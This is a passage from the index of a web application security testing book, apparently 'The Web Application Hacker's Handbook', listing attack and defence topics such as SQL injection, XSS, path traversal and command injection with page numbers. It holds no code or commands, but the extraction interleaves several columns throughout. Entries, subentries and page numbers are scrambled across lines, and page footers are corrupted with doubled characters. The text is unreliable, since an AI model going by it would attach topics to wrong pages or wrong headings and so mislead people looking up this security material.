JavaScript hijacking, 523–524\nweb server, 671–677 hacker’s methodology, 849–850 edit parameter, 107\nhacker’s methodology, 847 JavaScript, 440 Edwards, Dean, 471\ndefault credentials, web server, JavaScript API methods, 740 EJB. See Enterprise Java Bean\n670–671 web functionality, 62 electronic cookbook ciphers\nhacker’s methodology, 846 XSS, 440–442 (ECB ciphers), 224–226\ndefault lockdown, MS-SQL delivering, 448–449 e-mail\ndatabases, 326–327 fi nding and exploiting, account activation URLs, 184\ndefense in depth 487–491 credentials sent in, 184\nSQL injection, 342 input validation, 497 forged, 448\ntiered architectures, 656 output validation, 497–498 header injection, 398–399\nweb server software, 696–697 preventing, 496–498 stored XSS testing, 483–484\ndefense mechanisms. Seealso refl ected XSS converted to, as username, 167, 196\nsecurity 472–473 encoding\naccess steps, 441 Apache chunked overfl ow, 688\nauthentication, 18–19 DocumentRoot directive, 683 attackers and, 66–67\ncontrol, 20–21 DOM. See document object Base64, 69\nsession management, 19–20 model ASP.NET ViewState,\nattackers, 30–35 domain restriction cookies, 125–126\nadministrator alerting, 33–34 245–247 custom, path traversal\naudit log maintenance, 31–32 DOMTracer, 488 vulnerabilities, 377–378\nerrors, 30–31 dot character, script code hex, 69–70\nreacting to, 34–35 bypassing fi lters alternatives HTML, 68–69\nelements, 17–18 to, 466 developer mistakes, 494–495\ninput, 21–29 “dot-dot-slash” sequence, script code bypassing fi lters,\napproaches to, 23–25 369. Seealso path traversal 468\nuser access, 18–21 vulnerabilities Unicode, 67–68\ndefensive fi lters, refl ected XSS, Dowd, Mark, 634 Burp Intruder, 375\n455–456 downloading URL, 67\nDELETE method, 679 bytecode, 140 SQL injection, 300–301\nDELETE statements, 297–298 encrypting tokens, 231–232 truncating, 378\ndeliberate backdoor scripts, drop-down menus, web server software, 689–694\n660–661 authentication, 193 encrypting\ndevelopers DSer, Burp Suite, 136–137 .NET, 686\napplication logic fl aws, 429–430 Dump Servlet, Jetty, 672 “remember me” function, 177\nclient-side data transmission, dynamic code execution tokens, 223–233\n118 ASP.NET API methods, 722 attackers, 232–233\nHTML encoding mistakes, Java API methods, 715 Burp Intruder bit fl ipper,\n494–495 OS command injection, 362 228–231\nweb applications security, 3 CBC, 227–233\nvulnerabilities, 366–367\ndigest authentication, 50–51 downloading, 231–232\nPerl language API methods,\ndirectory listings, web servers, ECB ciphers, 224–226\n738\n677–679 “reveal” encryption oracle,\nPHP API methods, 730–731\nAllaire JRun, 690–691 232\ndynamically constructed strings,\ndirectory names, 105 encryption oracle\n466\ndisabled elements application logic fl aws, 407–408\nattackers, 132–133 “remember me” function, 407\nE\nHTML forms, 131–133 database error messages,\ndiscount cheating, application E4X. See ECMAScript for XML 620–622\nlogic fl aws, 418, 429 Eagle, Chris, 634 “reveal,” encrypting tokens,\ndiscretionary access control eavesdroppers 232\n(DAC), 282 authentication, 169 Enterprise Java Bean (EJB), 53\ndisjunctive queries fi lters, 350 session tokens, 234 enterprise resource planning\nLDAP injection, 351 eBay, 505 software (ERP), 4\n.dll fi les, 141 ECB ciphers. See electronic enumerating identifi ers, 572–583\nDNS rebinding, 563–564 cookbook ciphers basic approach, 574\nDOCTYPE element, 384–385 Echo Mirage, 139 Burp Intruder, 594–597\nbbiinnddeexx..iinndddd 886611 88//1199//22001111 1122::0011::3366 PPMM\nStuttard bindex.indd V1 - 08/13/2011 Page 862\n862 Index n F–F\ndetecting hits, 574–576 unhandled, 30–31 attribute names, 461\nexamples, 573 escaping attribute values, 462\nhacker’s methodology, application logic fl aws, 419–420 character sets, 464–465\napplication mapping, with backslash character, 419 tag brackets, 462–464\n797–798 JavaScript, script code tag name, 460–461\nHTTP status code, 574 bypassing fi lters, 465–466 input, path traversal\nJAttack, 577–583 XSS, 420 vulnerabilities, 374–377\nLocation header, 575 Etag string, 128–129 LDAP, 350\nresponse body, 575 eval function, 362, 722 Oracle PL/SQL Exclusion List\nresponse length, 574–575 script code bypassing fi lters bypassing, 692–694\nscripting, 576–577 alternatives to, 466 refl ected XSS\nSet-Cookie header, 575 event handlers defensive, 455–456\ntime delays, 575–576 HTML5, 458 sanitizing, 468–471\nERP. See enterprise resource script code in HTML with, signature-based, 456–457\nplanning software 457–458 sanitizing, refl ected XSS,\nerror messages Expires header, 42 468–471\nApache, 628 Extensible Markup Language script code bypassing, 465–468\nASP.NET, 628 (XML), 56. Seealso Simple dot character alternatives,\ndatabase, 619–622 Object Access Protocol; XML 466\nencryption oracle, 620–622 Path Language dynamically constructed\ninformation disclosure, E4X, 463 strings, 466\n619–620 injection, 383–390 encoding, 468\ndatabases, XSS in, 620 XXE, 384–386, 841 eval function alternatives,\ndebugger, 425–426, 618–619 interpreting, 387 466\ncommon, 619 XSS exploits JavaScript escaping, 465–466\ndynamically generated, 434 JavaScript in, 478–479 multiple technique\nengineering informative, sending cross-domain, combination, 466–467\n624–625 477–478 VBScript, 467\nexploiting, 615–625 Extract Grep function, 598 VBScript and JavaScript,\ngeneric, 628 467–468\nIE, 622 simple match conditions, 350\nF\ninformation disclosure, SQL injection bypassing,\n615–625 fail-open login function, 185–186, 311–313\ngeneric, 628 194 XSS\nJava, 628 failure messages, verbose, anti-, 452, 748\nkeywords, 622 166–169 blacklist-based, 451–452\nMicrosoft IIS, 628 fi le extensions, 102–105 IE, 479–481\nMS-SQL databases, 334–338 fi le inclusion web browsers, 479–481\nMySQL, 334–338 hacker’s methodology, 835–836 fi nancial services\nODBC, 624 local, 382 application logic fl aws, 412–416\nOracle databases, 334–338 remote, 381–382 ASPs, 658\npublic information, 623 fl aw testing, 383 fi ngerprinting databases, SQL\npublished content, 625 static resources, 382 injection, 303–304\nscript, 616–617 vulnerabilities, 381–383 Firebug, 785\nsearch engines, 623 fi nding, 382–383 Firefox, 459\nserver, 619–622 PHP, 381–382 browser extensions, 750\nSOAP injection, 388 fi le path manipulation, 368–383. cross-domain data capture, 521\nsource code, 623 Seealso path traversal Firesheep tool, 234\nSQL injection, 334–338 vulnerabilities hacker’s toolkit, 749–750\nstack traces, 617–618 fi lters Referrer header, 239\nUNION operator, 306 blocked characters, 311–312 Firesheep tool, Firefox, 234\nVBScript, 616 conjunctive queries, 350 fi rewalls, 12\nverbose, 30–31, 624 LDAP injection, 352–353 alerts, 33\nerrors disjunctive queries, 350 WAFs, NULL bytes, 460\nconditional, SQL injection, LDAP injection, 351 fi rst-order XSS. See refl ected XSS\n320–322 exploiting defective, 313 500 Internal Server\ndefense mechanisms handling HTML bypassing, 459–465 Error, 49\nattackers and, 30–31 attribute delimiters, 461–462 brute-force techniques, 85\nbbiinnddeexx..iinndddd 886622 88//1199//22001111 1122::0011::3366 PPMM\nStuttard bindex.indd V1 - 08/13/2011 Page 863\nIndex n G–H 863\n503 Service Unavailable, fuzzing, 572–573 authentication\n49 Burp Intruder, 600–602 application logic fl aws,\nFlash, 134–135 hacker’s methodology, 811–813\nbytecode, 141 parameter, 824–827 credentials, autogenerated,\n/crossdomain.xml, 525–526 integrated testing suites, 809–810\nLSOs, 553 762–763 credentials, unsafe\nsame-origin policy, 525–526 JAttack, 588–590 distribution, 810–811\nserialized data, 137–138 objective, 586–587 credentials, unsafe\nfont-family property, 518–519 strings, 587 transmission, 810\nforced browsing, application impersonation, 808–809\nlogic fl aws, 411 G insecure web storage, 811\nforgotten password, 584 password guessing, 807\ngeneral headers, 45\nattackers using, 14 password quality, 806\ngeneric error messages, 628\nformat string vulnerabilities password recovery, 807–808\nGET method, 42\nattackers, 644 “remember me” functions,\npurpose, 264\ncauses, 643 808\nGET request, 40\ndetecting, 644 understanding, 805\nXSS converting, 474–475\nhacker’s methodology, 838 username enumeration,\ngetCurrentUserRoles\nsource code, 710 806–807\nmethod, 261\nforms username uniqueness, 809\nGIFAR fi les, 485–486\nHTML, 58–59 vulnerability exploitation for\nGoogle, 89\nauthentication, 160–161 unauthorized access,\nOmitted Results, 90\nclient-side control of user 813\nquerying, 90\ninput with, 127–133 back-end request injection, 841\nGoogle Translate (GT), 530–531\nclient-side data transmission browser extensions, 802–804\nGrayHatHacking (Eagle & Harris\nwith hidden, 118–120 ActiveX controls, 804\n& Harper & Ness), 634\ndisabled elements, 131–133 debugger, 803–804\nGT. See Google Translate\nintercepting proxy decompiling, 802–803\nmodifying hidden, buffer overfl ow, 837–838\n119–120 H client-side\nlength limits, 128–129 hacker’s methodology data transmission, 801\nscript-based validation, access controls user input, 801–802\n129–131 insecure access, 823 cookie scope, 820–821\nweb functionality, 58–60 limited access, 822–823 CSRF, 820\n400 Bad Request, 48 multiple accounts, 822 DOM, 849–850\nbrute-force techniques, 84 requirements, 821 fi le inclusion, 835–836\n401 Unauthorized, 48 analysis format string vulnerabilities,\nbrute-force techniques, 84–85 attack surface mapping, 800 838\n403 Forbidden, 49 data entry points, 799 fuzzing parameters, 824–827\nbrute-force techniques, 84–85 functionality, 798–799 guidelines, 793–794\n404 Not Found, 49 technologies, 799–800 HTTP header injection, 830\n405 Method Not Allowed, 49 application logic fl aws information leakage, 852\n413 Request Entity Too attack surface, 842 input-based vulnerabilities,\nLarge, 49 incomplete input, 843 824–836\n414 Request URI Too Long, multistage functions, function-specifi c, 836–841\n49 842–843 integer vulnerabilities, 838\nframebusting, UI redress transaction logic, 844 LDAP injection, 839–840\nattacks, 514–515 trust relationships, 844 local privacy attacks, 850–851\nfunction callbacks, JavaScript application mapping, 795–798 miscellaneous checks, 849–852\nhijacking, 520 debug parameters, 798 native software bugs, 837–838\nfunctional paths, web default content, 797 open redirection\napplication pages versus, enumerating identifi ers, vulnerabilities, 830–831\n93–96 797–798 OS command injection,\nfunctionality. See web hidden content, 796–797 832–833\nfunctionality public information resources, path traversal vulnerabilities,\nfunction-specifi c input 796 833–835\nvulnerabilities, hacker’s of tokens to sessions, 818 refl ected XSS, 829–830\nmethodology, 836–841 visible content, 795–796 same-origin policy, 851–852\nbbiinnddeexx..iinndddd 886633 88//1199//22001111 1122::0011::3366 PPMM\nStuttard bindex.indd V1 - 08/13/2011 Page 864\n864 Index n H–H\nscript injection, 835 hidden content HTTP response splitting,\nsession management discovering, 80–93 534–535\ntoken insecure transmission, brute-force techniques, 81–85 input validation, 536\n817 inference from published preventing, 536\ntoken system log disclosure, content, 85–89 HTTP parameter injection (HPI),\n817–818 Nikto, 93 390\ntokens tested for meaning, public information, 89–91 causes, 393–394\n815–816 user-directed spidering, HPP, 394–395\ntokens tested for 81–83 HTTP parameter pollution (HPP)\npredictability, 816–817 web server leveraged for, client-side, 548–550\nunderstanding, 814–815 91–93 HPI, 394–395\nsessions Wikto, 92–93 HTTPRECON, 102\nfi xation, 819 hacker’s methodology, HTTPS, 49\nterminating, 818–819 application mapping, integrated testing suites,\nshared hosting, 845–846 796–797 intercepting proxies,\nSMTP injection, 836–837 hidden HTML form fi elds 755–758\nSOAP injection, 839 client-side data transmission login function, 170\nSQL injection, 827–829 with, 118–120 man-in-the-middle attacks,\nstored procedures, 831–832 intercepting proxy modifying, 566–568\nweak SSL ciphers, 851 119–120 proxy servers, 50\nweb servers, 846–849 hidden parameters, application session tokens, 234–236, 250\ndangerous HTTP methods, mapping, 96–97 HTTPWatch tool, IE, 748\n847 hijacking Hydra, 785–786\ndefault content, 847 JavaScript, 519–520 hyperlinks, web functionality, 58\ndefault credentials, 846 E4X, 523–524 hypertext markup language\nnative software bugs, 848 function callbacks, 520 (HTML). Seealso HTML5\nproxy server functionality, JSON, 521 ActiveX controls modifi cation,\n847 preventing, 524 557\nvirtual hosting, 847–848 variable assignment, 522 bypassing fi lters, 459–465\nWAFs, 848–849 sessions, 436 attribute delimiters, 461–462\nwork areas, 791–793 Holyfi eld, Brian, 138 attribute names, 461\nXPath injection, 840–841 horizontal access controls, attribute values, 462\nXXE injection, 841 258 character sets, 464–465\nhacker’s toolkit, 747 horizontal privilege escalation, tag brackets, 462–464\ncustom scripts, 786–789 259, 416 tag name, 460–461\nCurl, 788 Host header, 41 encoding, 68–69\nNetcat, 788–789 hosting. See shared hosting developer mistakes, 494–495\nStunnel, 789 HP OpenView, 359 forms, 58–59\nWget, 788 HPI. See HTTP parameter authentication, 160–161\nFirebug, 785 injection client-side control of user\nHydra, 785–786 HPP. See HTTP parameter input with, 127–133\nintegrated testing suites, pollution client-side data transmission\n751–773 HTML. See hypertext markup with hidden, 118–120\ncomponents, 752–769 language disabled elements, 131–133\ntypes, 751 HTML5 intercepting proxy\nNikto, 785 Ajax, 487 modifying hidden,\nweb browsers, 748–750 event handlers, 458 119–120\nChrome, 750 local privacy attacks, 554 length limits, 128–129\nFirefox, 749–750 same-origin policy, 528–529 script-based validation,\nIE, 748–749 script pseudo-protocols, 458 129–131\nWikto, 785 web functionality, 64–65 injection, cross-domain data\nHammad, Sherief, 322 HTTP. See hypertext transfer capture, 516–517\nHarper, Allen, 634 protocol refl ected XSS limiting, 495–496\nHarris, Shon, 634 HTTP header injection script code introduced in\nHEAD functions, 43 causes, 531–532 dynamically evaluated CSS\nHEAD method, 265 cookies, 533 styles, 459\nheap overfl ows, 635–636 exploiting, 532–535 event handlers, 457–458\nHeasman, John, 634 attackers, 534–535 script pseudo-protocols, 458\nhex encoding, 69–70 hacker’s methodology, 830 scripttags, 457\nbbiinnddeexx..iinndddd 886644 88//1199//22001111 1122::0011::3366 PPMM\nStuttard bindex.indd V1 - 08/13/2011 Page 865\nIndex n I–I 865\nstored XSS limiting, 495–496 application logs, 262 session fi xation, 537–540\ntag pairs, XSS, 422 identifi ers. See enumerating CSS, cross-domain data\nweb functionality with, 58 identifi ers capture, 517–519\nhypertext transfer protocol IE. See Internet Explorer e-mail header, 398–399\n(HTTP). Seealso HTTP header IEWatch tool, 79, 748 HPI, 390\ninjection If-Modified-Since, 128–129 causes, 393–394\naccess controls testing, 278 If-None-Match, 128–129 HTML, cross-domain data\nauthentication, 50–51 iframe, 511–515 capture, 516–517\nsessions avoided with, IIS, Microsoft HTTP header\n208–209 error messages, 628 attackers exploiting, 534–535\nbenefi ts, 5 ISAPI extensions, 688 causes, 531–532\ncookies, 19, 47 path traversal vulnerabilities, cookies, 533\nclient-side data transmission, 691–692 exploiting, 532–535\n121 impersonation, authentication, hacker’s methodology, 830\nsession management tokens, 178–180 HTTP response splitting,\n207–208, 234–236 hacker’s methodology, 808–809 534–535\nfi ngerprinting, 102 in-band delivery, XSS, 449–450 input validation, 536\nhacker’s methodology, web inducing actions, 501 output validation, 536\nservers, 847 request forgery preventing, 536\nheaders CSRF, 8, 244, 251, 504–511 interpreted language, 288–290\napplication mapping, input OSRF, 502–503 LDAP, 349–354\nentry points, 100–101 UI redress attacks, 508, 511–515 conjunctive queries fi lters,\ngeneral, 45 basic form, 511–513 352–353\nrequest, 45–46 framebusting, 514–515 exploiting, 351–353\nresponse, 46 mobile devices, 515 fl aws, 353–354\nsecurity assumptions, 123 preventing, 515 hacker’s methodology,\nHPI, 390 variations, 513 839–840\ncauses, 393–394 XSS attack payloads, 445–446 preventing, 354\nHPP, 394–395 inference vulnerabilities, 350–351\nclient-side, 548–550 information disclosure, login function bypassed,\nman-in-the-middle attacks, 626–627 288–290\n566–568 search engines, 626 NoSQL, 342–344\nmessages, 40–42 SQL injection, 319–324 MongoDB, 343–344\nmethods, 42–44 infi nite loops, 29 OS commands, 358–368\ninformation disclosure ASP.net, 360–361\norigins, 39\nerror messages, 615–625 dynamic code execution, 362\nproxy servers, 49–50\ngeneric, 628 dynamic code execution,\nrequests, 40–41\ninference, 626–627 vulnerabilities, 366–367\ndissecting, 107–108\nleaks fl aws, 363–366\ninput sources, 52\nclient-side, 629 hacker’s methodology,\nURL, 40, 42\npreventing, 627–629 832–833\nresponses, 41–42\nprotecting, 628–629 metacharacters, 420\nsplitting, 534–535\npublished content, 625 Perl language, 358–360\nserver-side redirection,\ninformation leakage, 8 preventing, 367–368\n390–392\nauthentication preventing, shell metacharacters, 363, 365\nexploiting, 391–392\n195–196 source code, 708\nSSL and, 49\nhacker’s methodology, 852 spaces, 366\nstatus codes, 48–49\ninformation disclosure time delay, 363–364\nenumerating identifi ers, 574\nclient-side, 629 script\nTCP protocol, 40\npreventing, 627–629 hacker’s methodology, 835\nhypothesis testing, statistical,\ninformation_schema, 309–310 preventing vulnerabilities,\n219–222\ninitialization vector (IV), 685 368\ninjection SMTP, 397–402\nI back-end request, 841 fl aws, 400–401\nID fi eld, 295 client-side, 531–550 hacker’s methodology,\nIDA Pro, 153 SQL, 547–548 836–837\niDefense, 558 code, 288 preventing, 402\nidentifi er-based functions cookie SOAP, 386–388\naccess controls, 261–262 attacker methods, 536–537 banking application, 387–388\nbbiinnddeexx..iinndddd 886655 88//1199//22001111 1122::0011::3366 PPMM\nStuttard bindex.indd V1 - 08/13/2011 Page 866\n866 Index n J–J\nerror messages, 388 blind, 347–348 hacker’s methodology, 838\nfi nding and exploiting, 389 fl aws, 348–349 overfl ows, 640–641\nhacker’s methodology, 839 hacker’s methodology, signedness errors, 641–642\npreventing, 27, 390 840–841 source code, 709–710\nSQL, 7, 14 informed, 346–347 integrated testing suites\nadvanced exploitation, preventing, 349 fuzzing, 762–763\n314–324 input. Seealso user input hacker’s toolkit, 751–773\nAPI methods, 291 “accept known good” components, 752–769\napplication logic fl aws, approach, 24 types, 751\n420–422 application mapping, entry intercepting proxies\nblind, 626 points for alternatives, 771–773\nbugs, 298–302 HTTP headers, 100–101 common features, 758–759\nclient-side, 547–548 out-of-band channels, 101 HTTPS, 755–758\ncolumn name, 301–302 request parameters, 99 web browser confi guration,\nconditional errors, 320–322 URL fi le paths, 98–99 752–755\ndatabase code components, blog applications, 22 manual request tools, 765–767\n741–742 boundary validation, 25–28, shared functions and utilities,\ndefense in depth, 342 313 768–769\nDELETE statements, 297–298 canonicalization, 28–29 shared token analyzers, 767\ndouble hyphen, 293 defense mechanisms, 21–29 Tamper Data, 772\nerror messages, 334–338 approaches to, 23–25 TamperIE, 772–773\nexploitation tools, 328–331 fi lters, path traversal vulnerability scanners, 764–765\nfi lter bypassing, 311–313 vulnerabilities, 374–377 standalone, 773–784\nfi ngerprinting databases, hacker’s methodology, web spidering, 760–762\n303–304 application logic fl aws work fl ow, 769–771\nhacker’s methodology, and incomplete, 843 intercepting proxies\n827–829 insertion, stored XSS, refl ected evolution, 751\ninference, 319–324 XSS eliminating integrated testing suites\ninput validation dangerous, 495 alternatives, 771–773\ncircumvented, 312 multistep validation, 28–29 common features, 758–759\nINSERT statements, 295–296 “reject known bad” approach, HTTPS, 755–758\nJavaScript errors, 299 23–24 web browser confi guration,\nnumeric data, 299–301, safe data handling approach, 752–755\n315–316 25 Internet. See World Wide Web\nORDER BY clause, 301–302 sanitization approach, 24–25 Internet Explorer (IE), 239, 459\nout-of-band channel, 316–319 semantic checks, 25 anti-XSS fi lters, 748\nparameterized queries, validation, 21–22, 313 error messages, 622\n339–341 application logic fl aws HTTPWatch tool, 748\npreventing, 27, 338–342 invalidating, 420–422 IEWatch tool, 79, 748\nquery structure, 301–302 circumventing, 312 refl ected XSS, 435\nsecond-order, 313–314 DOM-based XSS, 497 TamperIE, 772–773\nSELECT statements, 294–295 HTTP header injection, 536 userData, 554\nsource code, 705–706 problems, 26 web application hacker’s\nstring data, 298–299 stored XSS, refl ected XSS, toolkit, 748–749\nsyntax, 332–334 492–493 XSS fi lter, 479–481\ntime delays, 322–324 varieties, 21–23 Internet forums, public\nUNION operator, 304–308 input-based vulnerabilities, information, 91\nUNION operator data hacker’s methodology, interpreted language injection,\nextraction, 308–311 824–836 288–290\nUPDATE statements, 296–297 function-specifi c, 836–841 IP address availability, 100\nURL encoding, 300–301 INSERT statements IV. See initialization vector\nvulnerability exploitation, SQL injection, 295–296\n292–294 WHERE clause, 295 J\nTrojan, XSS attack payloads, insurance, application logic Jad, Java, 141\n444–445 fl aws, 412–413 decompiling, 148–150\nXML, 383–390 integer vulnerabilities .jad fi les, 148–150\nXXE, 384–386, 841 causes, 640 .jar fi les, 141\nXPath, 344–349 detecting, 642–643 JAttack\nbbiinnddeexx..iinndddd 886666 88//1199//22001111 1122::0011::3366 PPMM\nStuttard bindex.indd V1 - 08/13/2011 Page 867\nIndex n K–L 867\ndata harvesting, 585–586 preventing, 524 Lightweight Directory Access\nenumerating identifi ers, variable assignment, 522 Protocol (LDAP)\n577–583 $js function, 344 fi lters, 350\nextract function, 598 length limits, 471 injection, 349–354\nfuzzing, 588–590 logging keystrokes, 560 conjunctive queries fi lters,\nstrength, 590 open redirection 352–353\nJava vulnerabilities, 546 disjunctive queries fi lters, 351\nAPI methods port scanning, 561, 566 exploiting, 351–353\ndatabase access, 714–715 script code bypassing fi lters fl aws, 353–354\ndynamic code execution, 715 using VBScript and, hacker’s methodology,\nfi le access, 713 467–468 839–840\nOS command execution, SQL injection, errors in, 299 preventing, 354\n715–716 third-party applications vulnerabilities, 350–351\npotentially dangerous, currently used, 560–561 uses, 349–350\n713–716 web functionality, 61 Linder, Felix, 634\nsockets, 716 XSS, 436–438 Litchfi eld, David, 320, 327, 693\nURL redirection, 716 XSS exploits executing, in XML LOAD_FILE command, 328\napplets, 134 responses, 478–479 local fi le inclusion, 382\ndecompiling browser JavaScript Object Notation tiered architectures, 652–654\nextensions, 146–150 (JSON) local privacy attacks\nbytecode, 141 cross-domain requests, autocomplete, 552\ndebuggers, 151–152 477 browsing history, 552\nerror messages, 628 JavaScript hijacking, 521 Flash LSOs, 553\nJad, 141 web functionality, 63 hacker’s methodology, 850–851\ndecompiling, 148–150 JavaSnoop, 151–152 HTML5, 554\nsame-origin policy, 527 JBoss Application Server, IE userData, 554\nsecurity confi guring, 716–717 674–676 persistent cookies, 550\nserialized data, 136–137 Jetty, 218 preventing, 554–555\nsession interaction, 712–713 Dump Servlet, 672 Silverlight Isolated Storage, 553\nterminology, 53 Jitko worm, 530–531 testing, 550\ntiered architectures, 648 $js function, JavaScript, 344 Local Shared Objects (LSOs), 553\nuser input, 711–712 JMX, 674–676 Location header, 531–532\nJRun, Allaire, 690–691 enumerating identifi ers, 575\nAPI methods, 712\nJSON. See JavaScript Object location-based access controls,\nweb container, 53\nNotation 266\nweb functionality, 53–54\n.jsp fi le extension, 107 logging keystrokes, 560\nJava Servlet, 53\nJSwat, 151–152 logic. See application logic fl aws\nJava Virtual Machine (JVM), 134\nweb server software JVM. See Java Virtual Machine login function, 18–19, 160\nvulnerabilities, 690 account suspension, 197–198\njava.io.File, 713 K application logic fl aws, 426–427\njava.net.Socket, 716 Kamkar, Samy, 219 race conditions, 427\nJavaScript keystrokes, logging, 560 attackers, 164–165\nbrowsing history stolen with, Klein, Amit, 248 authentication\n560 brute-forcible, 162–165\nclient-side, validation with, verbose failure messages,\n130–131, 156 L 166–169\ndecompiling browser LAMP server, 650–651, 666 concurrent, 250\nextensions, original languages. See interpreted cookies, 163\nbytecode manipulation, language fail-open, 185–186, 194\n144 lazy load approach, data HTTPS, 170\nDOM, 440 transmission, 626 injection bypassing, 288–290\nDOM-based API methods, 740 LDAP. See Lightweight Directory multistage, 186–190, 194–195\nescaping, script code Access Protocol attackers, 188\nbypassing fi lters, 465–466 leaks. See information leakage common myth, 187\nhijacking, 519–520 length limits purpose, 186–187\nE4X, 523–524 JavaScript, 471 random questions, 189–190,\nfunction callbacks, 520 refl ected XSS, 471–473 194–195\nJSON, 521 Ley, Jim, 444 secondary challenge, 173, 200\nbbiinnddeexx..iinndddd 886677 88//1199//22001111 1122::0011::3366 PPMM\nStuttard bindex.indd V1 - 08/13/2011 Page 868\n868 Index n M–O\nsecret questions, 189 error messages, 334–338 .NET\nsession management, 206 out-of-band channels, 317 encryption, 686\ntokens, 539–540 syntax, 332–334 padding oracle, 685–687\ntiming differences, 168–169 WAITFOR command, 322–323 .NET Binary Format for SOAP\nusername enumeration, multistage functions (NBFS), 138\n166–169 access controls, 262–263 Netcat, 788–789\nlogout function, session testing, 271–273 NETGEAR router, 562\nmanagement, 242, 250 banking application, 263 network disclosure, session\nlogs. See system log disclosure, hacker’s methodology, tokens, 234–237\nsession tokens application logic fl aws, network hosts, attackers, 561–562\nLSOs. See Local Shared Objects 842–843 network perimeter, web\nlogin, 186–190, 194 application security and new,\nM attackers, 188 12–14\ncommon myth, 187 nextPayload method, 578\nmacros, request, 604–606\npurpose, 186–187 NGSSoftware, 640\nmagic_quotes-gpc directive,\nrandom questions, 189–190, Nikto\n734\n194–195 hacker’s toolkit, 785\nmail() command, 398–399\nmultistep validation, input, hidden content, 93\nmail services. See e-mail; SMTP\n28–29 maximizing effectiveness, 797\ninjection\nMySpace, stored XSS, 442–443, non-HTTP services, 562–563\nman-in-the-middle attacks,\n446 NoSQL\n566–568\nMySQL advantages, 343\nmanual request tools, integrated\nattackers, 328 data stores, 342–343\ntesting suites, 765–767\ncomments, 303–304, 312 injection, 342–344\nmapping. See application\ndouble hyphen, 293 MongoDB, 343–344\nmapping\nerror messages, 334–338 notNetgear function, 562\nMavituna, Ferruh, 566\nout-of-band channels, 319 nslookup command, 365\nMcDonald, John, 634\npath traversal vulnerabilities, NTLM protocol, 50\nmeaningful token attackers, 212\n651 NULL bytes\nmemory management, web\nsleep function, 323 attackers, 23–24\nserver software, 687–689\nsyntax, 332–334 WAFs, 460\nmetacharacters, OS command\ntiered architectures extracting, XSS, 460\ninjection, 420. Seealso shell\n650–652 NULL value, 306–307\nmetacharacters\nUDFs, 328 numeric data\nMicrosoft. Seealso Internet\nlimits, 417\nExplorer\nAsirra puzzles, 612 N SQL injection into, 299–301,\n315–316\nIIS naming schemes\nerror messages, 628 application mapping, 85–86\nISAPI extensions, 688 brute-force exercise, 88 O\npath traversal vulnerabilities, identifying, 87 obfuscation\n691–692 static resources, 87 bytecode, decompiling browser\nsecurity, 431–432 native client components, 153 extensions, 144–146\nSiteLock Active Template native compiled applications custom schemes, 109\nLibrary, 559 buffer overfl ow, 634–640 OCR. See optical character\nmobile devices examples, 633 recognition\napplications, 4 format string vulnerabilities, ODBC. See open database\nUI redress attacks, 515 643–644 connectivity\nmod_isapi, Apache, 688 integer vulnerabilities, 640–643 off-by-one vulnerabilities,\nmod_proxy, Apache, 688 testing for, 633–634 636–638\nMongoDB, NoSQL injection, native software bugs OllyDbg, 153\n343–344 hacker’s methodology, 837–838 Omitted Results, Google, 90\nMOVE method, 679–680 web servers, 848 100 Continue, 48\nMS-SQL databases source code, 709–710 on-site request forgery (OSRF),\nattackers, 326–327 NBFS. See .NET Binary Format 502–503\nautomated exploitation, 330 for SOAP onsubmit attributes, 130\nbatch queries, 317 negative price method, 120 opaque data\ndefault lockdown, 326–327 Ness, Jonathan, 634 attackers, 124\nbbiinnddeexx..iinndddd 886688 88//1199//22001111 1122::0011::3366 PPMM\nStuttard bindex.indd V1 - 08/13/2011 Page 869\nIndex n P–P 869\nclient-side data transmission, PL/SQL Exclusion List, change functionality, 171–172,\n123–124 676–677 193\nopen database connectivity web server software fi lter application logic fl aws,\n(ODBC), 624 bypass, 692–694 409–410\nopen redirection vulnerabilities web server, 676–677 misuse, 199\ncauses, 540–541 TheOracleHacker’sHandbook username, 172\nfi nding and exploiting, (Litchfi eld), 693 cleartext storage, 190–191\n542–546 oracles. See encryption oracle forgotten, 14, 584\nhacker’s methodology, 830–831 ORDER BY clause, 295 functionality, 173–175\nJavaScript, 546 SQL injection, 301–302 guessing, 160\npreventing, 546–547 Origin headers, 528–529 techniques, 163–164\nrickrolling attacks, 541 OS commands. See operating hacker’s methodology,\nsource code, 707–708 system commands authentication\nURLs, 542 OSRF. See on-site request forgery guessing, 807\nabsolute prefi x, 545–546 other user attackers, 431–432 quality, 806\nblocking absolute, 544–545 out-of-band channels recovery function, 807–808\nuser input, 543–544 application mapping, input hints, 174, 200\nOpenLDAP, 352 entry points, 101 predictable initial, 183\noperating system commands (OS MS-SQL databases, 317 real-world, 163\ncommands) MySQL, 319 recovery\nASP.NET API methods, Oracle databases, 317–318 challenges, 173–174\n722–723 SQL injection, 316–319 hacker’s methodology,\ninjection, 358–368 unavailable, 319 authentication, 807–808\nASP.net, 360–361 out-of-band delivery, XSS, 450 hints, 200\ndynamic code execution, output validation misuse, 199–200\n362 DOM-based XSS, 497–498 secondary challenge, 200\ndynamic code execution, HTTP header injection, 536 time-limited URLs, 174–175\nvulnerabilities, 366–367 stored XSS, refl ected XSS, requirements, 192\nfl aws, 363–366 493–495 resetting, 175\nhacker’s methodology, system-generated, 192\n832–833 P truncated, 180–181\nmetacharacters, 420 padding oracle weak, 161–162\nPerl language, 358–360 attack, 626 path restriction cookies, 247–248\npreventing, 367–368 .NET, 685–687 path traversal vulnerabilities\nshell metacharacters, 363, 365 pageid parameter, 598 Apple iDisk Server, 690\nsource code, 708 parameter-based access controls, application mapping, 371\nspaces, 366 265–266 attackers\ntime delay, 363–364 parameterized queries circumventing obstacles,\nJava API methods, 715–716 provisos, 341 374–377\nPerl language API methods, SQL injection, 339–341 successful, 374\n738 parameters targets, 370–371\nPHP API methods, 731 application mapping, input causes, 368–369\noptical character recognition entry points, 99 chrooted fi le system, 380–381\n(OCR), 611 hidden, application mapping, custom encoding, 377–378\nOPTIONS functions, 43 96–97 detecting, 372–374\nOPTIONS method, 679–680 URL, client-side data initial testing, 372\nOPTIONS request, 528 transmission, 121–122 exploiting, 379\nOracle parseResponse method, 585, fi nding, 370–378\ndatabases 589 hacker’s methodology, 833–835\nattackers, 327 passive scanning, 764–765 input fi lters, 374–377\n11g, 318 passwords Microsoft IIS, 691–692\nerror messages, 334–338 access controls attackers MySQL, 651\nout-of-band channels, harvesting, 275–276 preventing, 379–381\n317–318 backdoor, 178–179 source code, 706–707\nsyntax, 332–334 source code, 708 subtlety, 370\ntime delays, 323–324 brute-force techniques for UNIX compared to Windows,\nUNION operator, 307–308 wiki, 424 374\nbbiinnddeexx..iinndddd 886699 88//1199//22001111 1122::0011::3366 